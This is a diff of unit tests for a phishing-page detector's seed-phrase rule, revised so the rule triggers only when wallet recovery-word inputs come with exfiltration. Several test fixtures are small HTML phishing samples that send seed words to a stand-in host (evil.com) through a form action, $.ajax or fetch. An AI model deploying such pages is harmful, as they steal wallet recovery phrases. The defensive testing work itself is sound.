@@ -74,8 +74,9 @@ class TestSeedPhraseRule:
         assert result.signals["editable_count"] == 8
         assert result.signals["total_inputs"] >= 6
 
-    def test_six_inputs_with_seed_terms_triggers(self):
-        """Threshold lowered from 8 to 6 catches split-mnemonic phishing."""
+    def test_six_inputs_with_seed_terms_no_exfil_does_not_trigger(self):
+        """Legitimate seed phrase entry (no exfiltration) should not trigger.
+        This is the key false-positive fix for apps like ArDrive."""
         html = """<html><body>
         <p>Enter your recovery phrase</p>
         <input type="text"><input type="text"><input type="text">
@@ -83,7 +84,7 @@ class TestSeedPhraseRule:
         </body></html>"""
         soup = parse_html(html)
         result = self.rule.evaluate(html, soup)
-        assert result.triggered is True
+        assert result.triggered is False
 
     def test_five_inputs_does_not_trigger(self):
         """Five inputs is still below threshold even with seed terms."""
@@ -96,8 +97,21 @@ class TestSeedPhraseRule:
         result = self.rule.evaluate(html, soup)
         assert result.triggered is False
 
-    def test_recovery_key_term_triggers(self):
-        """New term 'recovery key' is detected."""
+    def test_recovery_key_with_exfil_triggers(self):
+        """recovery key term + inputs + external form action → triggers."""
+        html = """<html><body>
+        <p>Enter your recovery key</p>
+        <form action="https://evil.com/steal">
+        <input type="text"><input type="text"><input type="text">
+        <input type="text"><input type="text"><input type="text">
+        </form>
+        </body></html>"""
+        soup = parse_html(html)
+        result = self.rule.evaluate(html, soup)
+        assert result.triggered is True
+
+    def test_recovery_key_no_exfil_does_not_trigger(self):
+        """recovery key term + inputs but no exfil → clean."""
         html = """<html><body>
         <p>Enter your recovery key</p>
         <input type="text"><input type="text"><input type="text">
@@ -105,7 +119,80 @@ class TestSeedPhraseRule:
         </body></html>"""
         soup = parse_html(html)
         result = self.rule.evaluate(html, soup)
+        assert result.triggered is False
+
+    def test_seed_phrase_with_external_form_action_triggers(self):
+        """6 inputs + seed terms + external form action → triggers."""
+        html = """<html><body>
+        <p>Enter your recovery phrase</p>
+        <form action="https://evil.com/steal">
+        <input type="text"><input type="text"><input type="text">
+        <input type="text"><input type="text"><input type="text">
+        </form>
+        </body></html>"""
+        soup = parse_html(html)
+        result = self.rule.evaluate(html, soup)
         assert result.triggered is True
+
+    def test_seed_phrase_with_js_exfil_triggers(self):
+        """6 inputs + seed terms + $.ajax exfil → triggers."""
+        html = """<html><body>
+        <p>Enter your recovery phrase</p>
+        <input type="text"><input type="text"><input type="text">
+        <input type="text"><input type="text"><input type="text">
+        <script>$.ajax({url: "https://evil.com/steal", data: words});</script>
+        </body></html>"""
+        soup = parse_html(html)
+        result = self.rule.evaluate(html, soup)
+        assert result.triggered is True
+
+    def test_seed_phrase_with_fetch_exfil_triggers(self):
+        """6 inputs + seed terms + fetch + credential access → triggers."""
+        html = """<html><body>
+        <p>Enter your seed phrase</p>
+        <input type="text" id="w1"><input type="text" id="w2"><input type="text" id="w3">
+        <input type="text" id="w4"><input type="text" id="w5"><input type="text" id="w6">
+        <script>
+        fetch("https://evil.com/collect", {method: "POST", body: document.getElementById("w1").value});
+        </script>
+        </body></html>"""
+        soup = parse_html(html)
+        result = self.rule.evaluate(html, soup)
+        assert result.triggered is True
+
+    def test_seed_phrase_no_exfil_client_side_only(self):
+        """Legitimate client-side wallet tool: inputs + terms + local JS only → clean."""
+        html = """<html><body>
+        <p>Enter your 12-word recovery phrase to import your wallet</p>
+        <input type="text" id="w1"><input type="text" id="w2"><input type="text" id="w3">
+        <input type="text" id="w4"><input type="text" id="w5"><input type="text" id="w6">
+        <input type="text" id="w7"><input type="text" id="w8"><input type="text" id="w9">
+        <input type="text" id="w10"><input type="text" id="w11"><input type="text" id="w12">
+        <button onclick="importWallet()">Import</button>
+        <script>
+        function importWallet() {
+            var words = [];
+            for (var i = 1; i <= 12; i++) {
+                words.push(document.getElementById("w" + i).value);
+            }
+            // Derive wallet key locally — no external transmission
+            var key = deriveKey(words.join(" "));
+            localStorage.setItem("wallet", key);
+        }
+        </script>
+        </body></html>"""
+        soup = parse_html(html)
+        result = self.rule.evaluate(html, soup)
+        assert result.triggered is False
+
+    def test_exfil_signal_reported(self):
+        """Verify has_exfiltration key appears in signals."""
+        from tests.fixtures import SEED_PHRASE_PHISHING
+
+        soup = parse_html(SEED_PHRASE_PHISHING)
+        result = self.rule.evaluate(SEED_PHRASE_PHISHING, soup)
+        assert result.triggered is True
+        assert result.signals["has_exfiltration"] is True
 
 
 class TestExternalFormRule:
